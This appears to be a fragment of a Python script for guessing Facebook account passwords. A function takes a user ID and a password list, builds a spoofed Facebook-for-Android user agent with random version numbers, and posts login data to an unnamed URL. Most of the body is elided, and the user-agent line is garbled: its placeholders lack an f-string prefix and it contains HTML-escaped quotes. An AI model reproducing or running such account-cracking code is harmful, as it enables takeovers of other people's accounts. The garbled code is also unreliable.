...
def rndm1(uid,passlist):
        ...
        try:
                ...
                ua_string="Dalvik/2.1.0 (Linux; U; Android 11; CPH2499 Build/TP1A.220905.001) [FBAN/FB4A;FBAV/{str(rr(410,450))}.0.0.{str(rr(1,9))}.{str(rr(50,110))};FBPN/com.facebook.katana;FBLC/id_ID;FBBV/{str(rr(410000000,499999999))};FBCR/Indosat Ooredoo;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2499;FBSV/11;FBCA/arm64-v8a:null;FBDM/&quot;+&quot;{density=2.75,width=2307,height=1036};FB_FW/1;FBRV/0;] FBBK/1"
                        ...
                        lo = requests.post(url1,data=data,headers=head).json()
